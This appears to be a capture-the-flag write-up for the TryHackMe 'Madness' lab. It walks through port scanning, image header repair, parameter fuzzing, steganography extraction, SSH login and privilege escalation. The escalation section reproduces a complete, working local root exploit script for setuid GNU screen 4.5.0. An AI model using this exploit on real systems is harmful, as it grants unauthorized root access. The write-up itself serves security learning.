![image](https://user-images.githubusercontent.com/87468669/220812639-67e3081e-2238-408d-aaec-961d63f7db63.png)

first start enumeration using nmap

```
# Nmap 7.93 scan initiated Thu Feb 23 04:07:11 2023 as: nmap -sC -sV -T4 -oN normal.tcp -p 80,22 -Pn 10.10.190.159
Nmap scan report for 10.10.190.159
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 acf9851052656e17f51c34e7d86467b1 (RSA)
|   256 dd8e5aecb195cddc4d01b3fe5f4e12c1 (ECDSA)
|_  256 e9ede3eb58773b005e3af524d858348e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 23 04:07:25 2023 -- 1 IP address (1 host up) scanned in 13.89 seconds
```

![image](https://user-images.githubusercontent.com/87468669/220813132-3ae5fa3d-ee78-4ab1-bb58-c7566fd59df9.png)

we noticed a webserver running on port 80, opening it on a browser direscted us an apache default webpage.

![image](https://user-images.githubusercontent.com/87468669/220814870-aa7f3741-6ad7-4056-a9c3-939cc545fad6.png)

viewing the page source, we got to see an `img` file embedded in the source code. 🤔

![image](https://user-images.githubusercontent.com/87468669/220814993-679a8f7f-ad50-4eac-bdb3-eb3262846e4a.png)

viewing the image, we got nothing. let's download the image into our box

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ wget http://10.10.190.159/thm.jpg
--2023-02-23 04:27:12--  http://10.10.190.159/thm.jpg
Connecting to 10.10.190.159:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22210 (22K) [image/jpeg]
Saving to: ‘thm.jpg’

thm.jpg                                   100%[===================================================================================>]  21.69K   118KB/s    in 0.2s    

2023-02-23 04:27:12 (118 KB/s) - ‘thm.jpg’ saved [22210/22210]

                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ exiftool thm.jpg
ExifTool Version Number         : 12.44
File Name                       : thm.jpg
Directory                       : .
File Size                       : 22 kB
File Modification Date/Time     : 2020:01:06 11:34:26+01:00
File Access Date/Time           : 2023:02:23 04:27:12+01:00
File Inode Change Date/Time     : 2023:02:23 04:27:12+01:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : PNG image did not start with IHDR
```
downloaded the image, and using exiftool to check the metadata of the image file, we noticed it is a `png` file but it's saved as `jpg` let's check the header of the file and correct using hexeditor.

![image](https://user-images.githubusercontent.com/87468669/220815971-c08fd88b-14ad-4ee3-8b2d-5c84c662ffc2.png)

we can see the magic byte value for png, let's change it to jfif jpg image file.

![image](https://user-images.githubusercontent.com/87468669/220816172-af79e39d-8d17-4d7a-8983-ed36b9c60206.png)

change from `head` to `FF D8 FF E0 00 10 4A 46 49 46 00 01` save and exit.

![image](https://user-images.githubusercontent.com/87468669/220816437-cbf87ecc-e634-4c8f-bee4-eb6bf1660d5e.png)

opening the image, we got to see an hidden directory `/th1s_1s_h1dd3n` 😅. Now let's check out the dir.

![image](https://user-images.githubusercontent.com/87468669/220816738-dd8ce1d9-beb6-4958-ae0b-381888f67898.png)

navigating to the hidden dir, it is asking us to guess a secret 🙁. 

![image](https://user-images.githubusercontent.com/87468669/220817098-ee84d61f-d08c-4fa3-ad9f-af6035f9f372.png)

viewing the page source we got a hint on what the secret is. 

![image](https://user-images.githubusercontent.com/87468669/220817777-ada4d175-8b08-4f2e-8179-8d8950ab7db5.png)

as we can see `?secret=` is the parameter, let fuzz for the right number.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ crunch 1 2 1234567890 -o secret.txt
Crunch will now generate the following amount of data: 320 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 110 

crunch: 100% completed generating output
```
first make a numer wordlist ranging from 1-99

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ ffuf -u "http://10.10.190.159/th1s_1s_h1dd3n/?secret=FUZZ" -w secret.txt -fs 408,407

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.190.159/th1s_1s_h1dd3n/?secret=FUZZ
 :: Wordlist         : FUZZ: secret.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 408,407
________________________________________________

73                      [Status: 200, Size: 445, Words: 53, Lines: 19, Duration: 199ms]
:: Progress: [110/110] :: Job [1/1] :: 221 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
then we fuzzed using ffuf with the created wordlists and we got the secret number. let's try it out

![image](https://user-images.githubusercontent.com/87468669/220818236-3f07a3e0-84e7-4cab-8cc9-1229f63dd357.png)

cool 🙂 we got a passphrase `y2RPJ4QaPF!B` let's try steghige on the image file we got earlier.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ steghide extract -sf thm.jpg      
Enter passphrase: 
wrote extracted data to "hidden.txt".
                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```
cool we extracted the content and lol we got an encoded text that looks like a rot encoding. let's try decode it

![image](https://user-images.githubusercontent.com/87468669/220818704-66d524e2-02c9-4a1f-8a50-b023c4416cb2.png)

decoded the text `wbxre` and we got the username `joker`. let's try ssh using `joker:y2RPJ4QaPF!B`. 😧 did not work, let's check back out thm chall page

![image](https://user-images.githubusercontent.com/87468669/220819564-4893e034-7821-46e1-984e-e3e0a5832237.png)

let's try download this image to see if we have anything.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ wget https://i.imgur.com/5iW7kC8.jpg
--2023-02-23 05:10:46--  https://i.imgur.com/5iW7kC8.jpg
Resolving i.imgur.com (i.imgur.com)... 151.101.132.193
Connecting to i.imgur.com (i.imgur.com)|151.101.132.193|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 151181 (148K) [image/jpeg]
Saving to: ‘5iW7kC8.jpg’

5iW7kC8.jpg                               100%[===================================================================================>] 147.64K   536KB/s    in 0.3s    

2023-02-23 05:10:47 (536 KB/s) - ‘5iW7kC8.jpg’ saved [151181/151181]

                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ file 5iW7kC8.jpg                                                                    
5iW7kC8.jpg: JPEG image data, baseline, precision 8, 1920x1080, components 3
                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ steghide extract -sf 5iW7kC8.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ steghide extract -sf 5iW7kC8.jpg
Enter passphrase: 
wrote extracted data to "password.txt".
```
download the image file and used steghide to extract without supplying any passphrase. we got a `password.txt` file.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ cat password.txt 
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP

                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Madness]
└─$ ssh joker@10.10.190.159         
joker@10.10.190.159's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ 
uid=1000(joker) gid=1000(joker) groups=1000(joker)
```
reading the content of `password.txt` we got the password and then ssh using `joker:*axA&GF8dP` and boom it worked.


## Privilege Escalation

```
joker@ubuntu:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
joker@ubuntu:~$ 
```
checking for suid, we can see that `/bin/screen-4.5.0` is an suid. let's search for exploit on this screen version.

![image](https://user-images.githubusercontent.com/87468669/220822135-881c34f5-accc-44cd-9e35-51ca5c9e1f1f.png)

found and [exploit](https://github.com/XiphosResearch/exploits/tree/master/screen2root) on github.

```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```
let's run this exploit.

![image](https://user-images.githubusercontent.com/87468669/220822484-ef1391fd-e577-44df-8ae1-0ac3101598a2.png)

running the exploit dropped us into a root shell. 

![image](https://user-images.githubusercontent.com/87468669/220822833-fd753844-c631-4493-a144-33c432f1dd10.png)

And we are through. 😉









